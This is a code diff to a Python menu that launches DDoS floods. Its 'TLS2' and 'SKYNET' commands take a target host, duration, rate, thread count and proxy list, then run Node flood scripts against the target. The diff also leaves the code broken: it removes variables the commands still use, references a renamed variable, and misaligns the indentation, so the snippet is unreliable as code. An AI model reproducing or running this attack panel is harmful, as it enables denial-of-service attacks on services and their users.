@@ -101,9 +101,7 @@ elif "TLS2" in cnc:
     try:
         host = cnc.split()[1]
         time = cnc.split()[2]
-        Rate = cnc.split()[3]
-        threads = cnc.split()[4]
-        proxyFile = cnc.split()[5]
+        print("Attacking " + host + " For " + time + " ")
         os.system(f'node TLS2.js {host} {time} {Rate} {threads} {proxyFile}')
     except IndexError:
         print('Usage: TLS2 <host> <Time> <Rate> <threads>')
@@ -114,12 +112,10 @@ elif "TLS2" in cnc:
    
            elif "SKYNET" in cnc:  # SKYNET
             try:
-                target = cnc.split()[1]
+                host = cnc.split()[1]
                 time = cnc.split()[2]
-                Rate = cnc.split()[3]
-                threads = cnc.split()[4]
-                proxyFile = cnc.split()[5]
-                os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
+                print("Attacking " + host + " For " + time + " ")
+               os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
             except IndexError:
                 print('Usage: Skynet <Target> <Time> <Rate> <threads> ')
                 print('Example: Skynet https://example.com 120 512 1000')
